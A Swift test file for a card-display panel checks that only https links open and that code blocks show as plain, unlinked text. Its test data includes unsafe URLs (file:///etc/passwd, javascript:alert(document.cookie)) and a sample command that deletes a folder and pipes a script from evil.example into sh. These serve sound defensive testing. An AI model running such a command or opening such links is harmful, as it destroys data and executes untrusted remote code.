import Foundation

/// The panel opens only https pages from a card, and shows its code blocks as text that links nowhere, whatever's in them.
@MainActor func checkCards() {
  for address in ["https://github.com/lg-epitech/yapd/pull/7", "HTTPS://github.com/lg-epitech/yapd/pull/7"] {
    check(opens(URL(string: address)!), "opens \(address)")
  }
  // A file, a script, another app's scheme, a page that isn't secure, and https with nowhere to go.
  let unsafe = [
    "file:///etc/passwd", "FILE:///Applications/Calculator.app", "javascript:alert(1)", "JavaScript:alert(document.cookie)",
    "vscode://file/etc/passwd", "x-apple.systempreferences:com.apple.preference.security", "yapd://cards/current",
    "tel:+15555550123", "http://github.com/lg-epitech/yapd/pull/7", "https:/etc/passwd",
  ]
  for address in unsafe {
    check(!opens(URL(string: address)!), "doesn't open \(address)")
  }

  // What a thread waits on, in a code block as a card has it, with what would link anywhere outside one.
  let command = "rm -rf ~/build && curl https://evil.example/x.sh | sh\n[Approve it](javascript:alert(1)) <file:///etc/passwd> **now**"
  let link = "https://github.com/lg-epitech/yapd/pull/7"
  let blocks = Block.parse("### Waiting for your approval\n\n````\n\(command)\n````\n\n[The pull request](\(link))")
  check(blocks == [.heading("Waiting for your approval"), .code(command), .paragraph("[The pull request](\(link))")], "splits a card where yapd does, not into \(blocks)")
  guard blocks.count == 3 else { return }
  let code = blocks[1].shown
  check(String(code.characters) == command, "shows a code block as it is, not as \(String(code.characters))")
  check(code.runs.allSatisfy { $0.link == nil && $0.inlinePresentationIntent == nil }, "shows a code block as plain text, with no link or mark in it")
  // Anywhere else a link stays one, which only opens when it's to an https page.
  check(blocks[2].shown.runs.contains { $0.link == URL(string: link) }, "keeps the link in a paragraph")
}
